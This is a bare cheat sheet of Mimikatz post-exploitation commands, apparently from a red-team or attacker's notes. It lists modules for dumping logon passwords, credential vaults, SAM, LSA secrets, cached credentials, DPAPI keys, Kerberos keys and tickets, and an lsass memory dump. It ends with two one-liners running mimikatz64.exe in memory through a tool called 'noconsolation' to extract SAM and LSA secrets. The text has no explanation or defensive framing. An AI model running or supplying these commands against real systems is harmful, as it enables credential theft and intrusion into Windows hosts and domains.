```
.\mimikatz.exe  
privilege::debug  
sekurlsa::logonPasswords full  
vault::cred  
vault::list  
token::elevate  
vault::cred  
vault::list  
lsadump::sam  
lsadump::secrets  
lsadump::cache  
sekurlsa::dpapi  
sekurlsa::ekeys  
sekurlsa::minidump lsass.dmp  
kerberos::tgt
```



```
noconsolation /exe/mimikatz64.exe privilege::debug token::elevate lsadump::secrets exit

noconsolation /exe/mimikatz64.exe privilege::debug token::elevate lsadump::sam exit


```